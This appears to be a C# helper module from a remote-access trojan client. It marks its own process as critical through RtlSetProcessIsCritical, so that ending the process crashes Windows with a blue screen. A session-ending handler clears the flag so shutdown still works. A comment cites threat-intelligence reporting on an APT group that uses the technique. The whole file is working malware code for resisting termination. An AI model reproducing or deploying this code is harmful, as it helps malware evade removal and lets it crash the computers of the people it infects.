using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Threading;

namespace Client.Helper
{
    public static class ProcessCritical
    {

        public static void SystemEvents_SessionEnding(object sender, SessionEndingEventArgs e)
        {
            if (Convert.ToBoolean(Settings.BDOS) && Methods.IsAdmin())
                Exit();
        }
        public static void Set()
            /* Set
    *       About:
    *           Sets process as critical with RtlSetProcessIsCritical
    *       Results:
    *           If the process is set as critical and then closed the computer will Blue Screen of Death (BSOD)
    *       CTI and References:
    *           https://blogs.blackberry.com/en/2023/02/blind-eagle-apt-c-36-targets-colombia
    *           http://www.pinvoke.net/default.aspx/ntdll/RtlSetProcessIsCritical.html?diff=y
    *
    */
        {
            try
            {
                SystemEvents.SessionEnding += new SessionEndingEventHandler(SystemEvents_SessionEnding);
                Process.EnterDebugMode();
                Helper.NativeMethods.RtlSetProcessIsCritical(1, 0, 0);
            }
            catch { }
        }
        public static void Exit()
        {
            try
            {
                NativeMethods.RtlSetProcessIsCritical(0, 0, 0);
            }
            catch
            {
                while (true)
                {
                    Thread.Sleep(100000); //prevents a BSOD on exit failure
                }
            }
        }
    }
}
